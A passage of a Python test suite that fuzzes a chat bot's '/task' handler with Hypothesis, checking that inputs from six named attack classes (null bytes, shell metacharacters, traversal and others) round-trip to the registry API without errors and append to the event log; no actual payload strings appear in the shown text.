    # example would inflate the diff to >=2 bytes and fail under the old
    # strict equality; ``>0`` keeps the property meaningful without the
    # brittleness.
    new_bytes, new_offset = _read_log_bytes_since(events_dir, log_offset_before)
    bytes_delta = len(new_bytes)
    assert bytes_delta > 0, (
        f"expected at least 1 new envelope appended to JSONL log; got 0 bytes "
        f"(offset {log_offset_before} → {new_offset})"
    )

    # H6 — verbatim payload assertion against the HTTP request body bytes.
    #
    # The IDEAL property is "the input round-trips through the JSONL writer
    # verbatim." Today's spine serialises ``EventEnvelope.payload`` as ``{}``
    # for ``task.created`` events (Story 3.8 Completion Notes / AC-13 — no
    # spine fix possible in this story), so the description does NOT appear
    # in the JSONL bytes. The closest achievable verbatim assertion is:
    #
    #   ``json.dumps(description)[1:-1]`` (the JSON wire-form of the string
    #   value, minus outer quotes) MUST appear in the outbound HTTP request
    #   body bytes captured by the recorder.
    #
    # AC-5.2 already validated the title field via ``body_obj["title"]``
    # (structured parse). This raw-bytes check is the complementary
    # wire-level assertion: it catches any hypothetical codec or
    # re-encoding layer that might have mutated the payload between the
    # Python string and the JSON serialisation on the wire.
    #
    # ``ensure_ascii=False`` keeps UTF-8 multi-byte sequences intact in
    # the wire form so the check works for arbitrary unicode (including
    # code points > U+007F). For ASCII/control chars, ``json.dumps``
    # produces ``\uXXXX`` escapes; ``ensure_ascii=False`` preserves the
    # raw bytes for non-ASCII code points.
    # Note: ``_expected_title(description)`` = ``description.strip()`` — the
    # bot's handler strips leading/trailing whitespace before posting. The
    # verbatim check uses the STRIPPED form so the wire assertion matches what
    # actually traveled across the HTTP wire (not the raw unstripped input).
    json_wire = _json.dumps(_expected_title(description), ensure_ascii=False)[1:-1].encode("utf-8")
    assert json_wire in body_bytes, (
        f"description JSON wire form not found verbatim in outbound request body; "
        f"expected {json_wire!r} not found in {body_bytes!r}"
    )
    return new_offset


# ---------------------------------------------------------------------------
# Per-example driver — invoked from each Hypothesis test body
# ---------------------------------------------------------------------------


async def _drive_one_example(
    description: str,
    *,
    registry_client: RegistryAPIClient,
    recorder: _RequestRecorder,
    events_dir: Path,
    log_offset_before: int,
) -> int:
    """Push one fuzz example through ``handle_task`` and assert AC-5.

    Returns the new log-offset (caller updates the harness cache).

    Story 3.8 review M7/M9: identity-bearing fields (``message_id``,
    ``chat_id``, ``user_id``) are minted from a fresh UUIDv4 per call so
      (a) Hypothesis ExampleDB replay of a previous failing example does
          not collide with the registry-api idempotency cache (which would
          return ``X-Idempotency-Status: replayed`` and skip the writer),
      (b) a Hypothesis-generated description equal to ``str(<id>)`` cannot
          coincidentally match a header value.

    Story 3.8 review L8: ``MagicMock(spec=Bot)`` so a future regression
    where the handler stops calling ``bot.send_message``/``bot.reply_to``
    would not silently pass through MagicMock proxying.
    """
    chat_id = _new_random_id()
    user_id = _new_random_id()
    message_id = _new_random_id()
    msg = _make_message(
        f"/task {description}",
        message_id=message_id,
        chat_id=chat_id,
        user_id=user_id,
    )
    bot = MagicMock(spec=Bot)
    recorder.reset()

    # AC-5.4 — no exception escapes. ``handle_task`` is contract-bound to
    # absorb every error path (Story 3.1 M3); any escape is a regression.
    await handle_task(msg, bot, registry_client)

    return _assert_input_safety(
        description,
        recorder=recorder,
        events_dir=events_dir,
        log_offset_before=log_offset_before,
    )


def _drive(h: _Harness, description: str) -> None:
    """Sync→async adapter shared by every Hypothesis test in this file.

    Drives a single fuzz example on the harness's owned event loop. Reads
    the cached ``events_log_offset`` (Story 3.8 review H10) and writes back
    the new offset returned by ``_drive_one_example``.
    """
    assert h.loop is not None
    assert h.registry_client is not None
    assert h.recorder is not None
    assert h.events_dir is not None
    new_offset = h.loop.run_until_complete(
        _drive_one_example(
            description,
            registry_client=h.registry_client,
            recorder=h.recorder,
            events_dir=h.events_dir,
            log_offset_before=h.events_log_offset,
        )
    )
    h.events_log_offset = new_offset


# ---------------------------------------------------------------------------
# 10K combined fuzz test (AC-3) — slow, nightly only
# ---------------------------------------------------------------------------


# Story 3.8 review L11: see _PER_STRATEGY_SETTINGS for the
# function_scoped_fixture suppression rationale + hypothesis docs link.
# Story 3.8 review M15: ``deadline=None`` removes Hypothesis's per-example
# timeout safety net. ``pytest-timeout`` is NOT in dev deps (verified
# 2026-04-30; AC-14 forbids new third-party deps in this story), so the
# safety net here is the CI job-level timeout. Per-example budget on dev
# hardware is ~10 ms; a regression introducing an unbounded loop would be
# caught at the CI job-timeout boundary (typically 30 min nightly).
@pytest.mark.fuzz
@pytest.mark.slow
@settings(
    max_examples=10_000,
    deadline=None,  # in-process httpx + ASGI + JSONL is slow under 10K
    suppress_health_check=[HealthCheck.function_scoped_fixture],
)
@given(description=_attack_input_strategy())
def test_no_command_injection_through_task_handler(
    harness: _Harness,
    description: str,
) -> None:
    """AC-3 / AC-5: 10,000-example combined sweep over all six attack classes.

    ``deadline=None`` per AC-10 — end-to-end requests are slow and a per-
    example deadline would flag false-positive flakes under a 10K budget.
    ``function_scoped_fixture`` health-check is suppressed because the
    ``harness`` fixture intentionally reuses one ASGI app + one
    ``AsyncClient`` across every example (cf. Hypothesis docs on long-lived
    test resources).
    """
    _drive(harness, description)


# ---------------------------------------------------------------------------
# Per-strategy targeted tests (AC-4) — fast, run on PR gate
# ---------------------------------------------------------------------------

# Story 3.8 review L11: ``HealthCheck.function_scoped_fixture`` suppression
# is documented at:
#   https://hypothesis.readthedocs.io/en/latest/settings.html#hypothesis.HealthCheck.function_scoped_fixture
# The harness intentionally reuses one ASGI app + one AsyncClient across
# every example (rebuilding per example would push the 10K test budget
# well past 10 minutes); the harness owns its asyncio event loop for
# the lifetime of the test.
_PER_STRATEGY_SETTINGS = settings(
    max_examples=500,
    deadline=None,
    suppress_health_check=[HealthCheck.function_scoped_fixture],
)


def _nonempty(strategy: st.SearchStrategy[str]) -> st.SearchStrategy[str]:
    """Apply the M5 non-empty filter to an individual strategy.

    Story 3.8 review M5: the combined ``_attack_input_strategy()`` applies
    ``.filter(lambda s: bool(s.strip()))`` so Hypothesis only generates
    inputs that the bot's handler will actually forward to the registry.
    Per-strategy tests must apply the SAME filter; without it, a strategy
    that happens to generate whitespace-only strings (e.g. a shell-metachar
    strategy drawing only ``'\\n'``) would cause ``recorder.last is None``
    and trip the assertion added to replace the old early-return branch.
    """
    return strategy.filter(lambda s: bool(s.strip()))


@pytest.mark.fuzz
@_PER_STRATEGY_SETTINGS
@given(description=_nonempty(_null_byte_strategy()))
def test_no_injection_through_null_bytes(
    harness: _Harness,
    description: str,
) -> None:
    """AC-4 — null-byte attack class only, 500 examples."""
    _drive(harness, description)


@pytest.mark.fuzz
@_PER_STRATEGY_SETTINGS
@given(description=_nonempty(_shell_metachar_strategy()))
def test_no_injection_through_shell_metacharacters(
    harness: _Harness,
    description: str,
) -> None:
    """AC-4 — shell-metacharacter attack class only, 500 examples."""
    _drive(harness, description)


@pytest.mark.fuzz
@_PER_STRATEGY_SETTINGS
@given(description=_nonempty(_nested_quoting_strategy()))
def test_no_injection_through_nested_quoting(
    harness: _Harness,
    description: str,
) -> None:
    """AC-4 — nested-quoting attack class only, 500 examples."""
    _drive(harness, description)


@pytest.mark.fuzz
@_PER_STRATEGY_SETTINGS
@given(description=_nonempty(_directory_traversal_strategy()))
def test_no_injection_through_directory_traversal(
    harness: _Harness,
    description: str,
) -> None:
    """AC-4 — directory-traversal attack class only, 500 examples."""
    _drive(harness, description)


@pytest.mark.fuzz
@_PER_STRATEGY_SETTINGS
@given(description=_nonempty(_ansi_escape_strategy()))
def test_no_injection_through_ansi_escapes(
    harness: _Harness,
    description: str,
) -> None:
    """AC-4 — ANSI-escape attack class only, 500 examples."""
    _drive(harness, description)


@pytest.mark.fuzz
@_PER_STRATEGY_SETTINGS
@given(description=_nonempty(_git_refname_injection_strategy()))
def test_no_injection_through_git_refname_patterns(
    harness: _Harness,
    description: str,
) -> None:
    """AC-4 — git ref-name injection attack class only, 500 examples."""
    _drive(harness, description)
